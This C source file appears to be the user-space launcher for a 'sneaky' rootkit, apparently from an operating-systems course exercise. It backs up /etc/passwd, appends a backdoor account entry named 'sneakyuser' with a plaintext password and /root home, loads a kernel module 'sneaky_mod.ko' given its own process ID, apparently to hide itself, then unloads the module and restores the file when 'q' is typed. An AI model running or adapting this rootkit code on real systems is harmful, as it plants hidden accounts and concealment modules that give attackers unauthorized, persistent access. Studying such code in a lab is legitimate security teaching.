#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void copy_file(const char *src, const char *dst) {
  pid_t pid = fork();

  if (pid == 0) {
    execl("/bin/cp", "cp", src, dst, NULL);
    perror("Error executing cp");
    exit(EXIT_FAILURE);
  } else if (pid > 0) {
    waitpid(pid, NULL, 0);
  } else {
    perror("Error forking");
    exit(EXIT_FAILURE);
  }
}

void modify_passwd_file() {
  FILE *passwd_file = fopen("/etc/passwd", "a");
  if (passwd_file == NULL) {
    perror("Error opening /etc/passwd");
    exit(EXIT_FAILURE);
  }
  fprintf(passwd_file, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(passwd_file);
}

void insmod_sneaky_mod(int sneaky_pid) {
  pid_t pid = fork();

  if (pid == 0) {
    char sneaky_pid_str[16];
    snprintf(sneaky_pid_str, sizeof(sneaky_pid_str), "sneaky_pid=%d", sneaky_pid);
    execl("/sbin/insmod", "insmod", "sneaky_mod.ko", sneaky_pid_str, NULL);
    perror("Error executing insmod");
    exit(EXIT_FAILURE);
  } else if (pid > 0) {
    waitpid(pid, NULL, 0);
  } else {
    perror("Error forking");
    exit(EXIT_FAILURE);
  }
}

void rmmod_sneaky_mod() {
  pid_t pid = fork();

  if (pid == 0) {
    execl("/sbin/rmmod", "rmmod", "sneaky_mod", NULL);
    perror("Error executing rmmod");
    exit(EXIT_FAILURE);
  } else if (pid > 0) {
    waitpid(pid, NULL, 0);
  } else {
    perror("Error forking");
    exit(EXIT_FAILURE);
  }
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  // Step 1: Copy /etc/passwd to /tmp/passwd
  copy_file("/etc/passwd", "/tmp/passwd");
  // Step 2: Add sneakyuser entry to /etc/passwd
  modify_passwd_file();
  // Step 3: Load the sneaky module and pass process ID
  insmod_sneaky_mod(getpid());
  // Step 4: Wait for 'q' character from keyboard input
  char ch;
  while ((ch = getchar()) != 'q') {
    // do nothing, just wait for 'q'
  }
  // Step 5: Unload the sneaky kernel module
  rmmod_sneaky_mod();
  // Step 6: Restore /etc/passwd and remove sneakyuser entry
  copy_file("/tmp/passwd", "/etc/passwd");
  return 0;
}
